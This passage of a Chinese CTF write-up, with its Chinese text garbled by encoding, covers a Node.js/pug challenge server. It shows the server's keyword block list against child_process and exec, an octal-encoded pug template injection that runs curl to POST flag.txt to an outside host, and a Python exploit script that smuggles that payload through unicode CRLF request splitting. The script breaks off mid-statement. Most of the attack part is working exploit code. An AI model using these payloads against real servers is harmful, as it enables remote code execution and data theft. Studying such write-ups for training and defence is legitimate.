&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">pug2&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/[a-z]/g&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">authheader&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;secretpassword&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">pug&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">pug2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;No characters&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;You need to come from localhost&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/core&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://localhost:8081/getMeme?&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">q&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt;Errrrr, You have been Blocked&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;ECONNRESET&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Timeout occurs&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">resps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resps&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;search param &amp;#39;q&amp;#39; missing!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;global&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;mainModule&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;require&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;\&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8081&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">address&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">port&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Example app listening at http://%s:%s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æžœä¸Šä¸€ä¸ªé¢˜ä»”ç»†åˆ†æžçš„è¯å°±ä¼šå‘çŽ°è¿™ä¸ªé¢˜åªæ˜¯ä»£ç åšäº†ä¸€äº›å¾®å°çš„æ”¹åŠ¨&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205214720894.png" alt="image-20211205214720894">&lt;/p>
&lt;p>éœ€è¦å¤šæž„é€ ä¸€ä¸ªè¯·æ±‚å¤´ï¼Œæ¢è¡Œçš„CRLFå’Œç©ºæ ¼SPæˆ‘ä»¬ç”¨unicodeï¼Œè€Œpugæ‰§è¡Œå‘½ä»¤çš„éƒ¨åˆ†æˆ‘ä»¬å¯ä»¥ç”¨å…«è¿›åˆ¶å­—ç¬¦&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// valid
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;evalcode&amp;#34;&lt;/span>&lt;span style="color:#111">)()&lt;/span>
&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;\143\157\156\163\164\162\165\143\164\157\162&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// valid,executable
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">42&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">143&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">157&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">156&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">163&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">164&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">162&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">165&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">143&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">164&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">157&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">162&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>&lt;span style="color:#ae81ff">42&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// invalid,since &amp;#34; is encoded
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>pugæ¨¡æ¿ä¸¤ç§å½¢å¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">shellcode&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#75af00">shellcode&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å†™ä¸€ä¸ªå¤–å¸¦flagçš„payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">[][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;console.log(this.process.mainModule.require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;curl 172.19.0.1:8888 -X POST -d @flag.txt&amp;#39;))&amp;#34;&lt;/span>&lt;span style="color:#111">)()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘æ ¹æ®è¿™ä½å¤§ä½¬çš„py2ç‰ˆ&lt;a href="https://ctftime.org/writeup/18293">exp.py&lt;/a>å†™äº†ä¸€ä¸ªpy3ç‰ˆæœ¬çš„ï¼Œå¹¶ä¸”æ”¹çš„ç®€æ´äº†ä¸€äº›ï¼ˆæœ‰äº†ä¸€äº›é€šç”¨æ€§ï¼Œä½†æ˜¯ç”±äºŽè¿˜æ˜¯éƒ¨åˆ†unicodeç¼–ç ï¼Œæ€»ä½“ä¸Šä¸å¦‚å…¨ç¼–ç çš„ç¨³&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.utils&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span>
&lt;span style="color:#111">SPACE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0120&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">CRLF&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u010d\u010a&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">SLASH&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u012f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># ä»…å¯¹å­—æ¯è¿›è¡Œç¼–ç &lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">str2Oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:]&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">i&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;o&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">_pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;-[][&amp;#34;constructor][&amp;#34;constructor](&amp;#34;console.log(this.process.mainModule.require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;curl http://ip:port/ -d @/flag.txt&amp;#39;))&amp;#34;)()&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str2Oct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_pug&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;%22&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;%27&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># print(pug)&lt;/span>
&lt;span style="color:#75715e"># print(quote(pug))&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;amiz HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">GET /flag HTTP/1.1
&lt;/span>&lt;span style="color:#d88200">x-forwarded-for: 127.0.0.1
&lt;/span>&lt;span style="color:#d88200">adminauth: secretpassword
&lt;/span>&lt;span style="color:#d88200">pug: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">pug&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;span style="color:#d88200">test: &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SPACE&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SLASH&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">CRLF&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
